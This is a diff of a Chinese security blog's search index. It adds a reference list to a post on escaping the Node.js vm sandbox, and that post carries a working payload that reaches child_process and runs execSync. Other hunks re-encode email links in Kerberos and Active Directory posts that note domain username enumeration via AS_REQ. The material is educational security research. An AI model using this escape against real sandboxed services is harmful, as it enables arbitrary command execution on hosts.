@@ -37,7 +37,14 @@
 <p>由于 JS 里所有对象的原型链都会指向 Object.prototype，且 Object.prototype 和 Function 之间是相互指向的，所有对象通过原型链都能拿到 Function，最终完成沙盒逃逸并执行代码。</p>
 <p>逃逸后代码可以执行如下代码拿到 require，从而并加载其他模块功能</p>
 <p>把原型链污染中的常用Payload转换过来如下</p>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">    var exec = this.constructor.constructor;</span></span><br><span class="line"><span class="string">    var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();</span></span><br><span class="line"><span class="string">    console.log(require(&#x27;child_process&#x27;).execSync(&quot;ls&quot;).toString());</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line">    ctx</span><br><span class="line">);</span><br></pre></td></tr></table></figure>]]></content>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> ctx = &#123;</span><br><span class="line">    <span class="variable language_">console</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">vm.<span class="title function_">runInNewContext</span>(</span><br><span class="line">    <span class="string">`</span></span><br><span class="line"><span class="string">    var exec = this.constructor.constructor;</span></span><br><span class="line"><span class="string">    var require = exec(&#x27;return process.mainModule.constructor._load&#x27;)();</span></span><br><span class="line"><span class="string">    console.log(require(&#x27;child_process&#x27;).execSync(&quot;ls&quot;).toString());</span></span><br><span class="line"><span class="string">`</span>,</span><br><span class="line">    ctx</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
+
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://www.anquanke.com/post/id/166747">NodeJS沙箱逃逸分析</a></p>
+<p><a href="http://nodejs.cn/api/vm.html">官方API</a></p>
+<p><a href="https://aotu.io/notes/2020/10/28/node-sandbox-escape-analysis/">凹凸实验室</a></p>
+<p><a href="https://lequ7.com/guan-yu-javascriptnodejs-sha-he-tao-yi-fen-xi.html">关于javascript:nodejs-沙盒逃逸分析</a></p>
+<p><a href="https://segmentfault.com/a/1190000012672620">NPM酷库：vm2，安全的沙箱环境</a></p>
+]]></content>
       <categories>
         <category>Web安全</category>
       </categories>
@@ -966,7 +973,7 @@
 <ul>
 <li>KRB_NT_PRINCIPAL &#x3D; 1 means just the name of the principal 如dailker</li>
 <li>KRB_NT_SRV_INST &#x3D; 2 service and other unique instance (krbtgt) 如krbtgt，cifs</li>
-<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#117;&#115;&#x65;&#x72;&#64;&#100;&#x6f;&#109;&#x61;&#x69;&#110;&#46;&#x63;&#x6f;&#109;">&#117;&#115;&#x65;&#x72;&#64;&#100;&#x6f;&#109;&#x61;&#x69;&#110;&#46;&#x63;&#x6f;&#109;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
+<li>KRB_NT_ENTERPRISE_PRINCIPAL &#x3D; 10 如 <a href="mailto:&#117;&#x73;&#x65;&#x72;&#64;&#x64;&#x6f;&#109;&#97;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;">&#117;&#x73;&#x65;&#x72;&#64;&#x64;&#x6f;&#109;&#97;&#x69;&#x6e;&#x2e;&#x63;&#x6f;&#109;</a><br>在AS_REQ里面cname 是请求的用户,这个用户名存在和不存在，返回的包有差异，可以用于枚举域内用户名。详情见<a href='#p1'>相关的安全问题&gt;用户名枚举</a></li>
 </ul>
 </li>
 <li><p>sname<br>PrincipalName 类型<br>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</p>
@@ -3066,7 +3073,7 @@
 <p>值得注意的是，displayName不能用于登陆，虽然跟域用户名往往一样。但是这个不是直接用于登陆的我们登陆用的账号，在一些公司里面，displayName往往是中文，登陆的用户名是拼音。登陆的格式有以下两种格式。</p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt0188d6994cbdbc4240.png"></p>
 <ol start="4">
-<li>第一种格式是UserPrincipalName，我们简称为UPN，一般的格式是用户名@域名这样的格式。<br>​<br>比如这里就是<a href="mailto:&#108;&#105;&#x73;&#x69;&#x40;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#111;&#99;&#x61;&#x6c;">&#108;&#105;&#x73;&#x69;&#x40;&#116;&#101;&#115;&#x74;&#x2e;&#x6c;&#111;&#99;&#x61;&#x6c;</a></li>
+<li>第一种格式是UserPrincipalName，我们简称为UPN，一般的格式是用户名@域名这样的格式。<br>​<br>比如这里就是<a href="mailto:&#108;&#105;&#115;&#105;&#64;&#116;&#x65;&#115;&#x74;&#46;&#x6c;&#111;&#99;&#x61;&#x6c;">&#108;&#105;&#115;&#105;&#64;&#116;&#x65;&#115;&#x74;&#46;&#x6c;&#111;&#99;&#x61;&#x6c;</a></li>
 </ol>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01e2811e15d3228c71.png"></p>
 <p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownt01b73488011e5e86a7.png"></p>
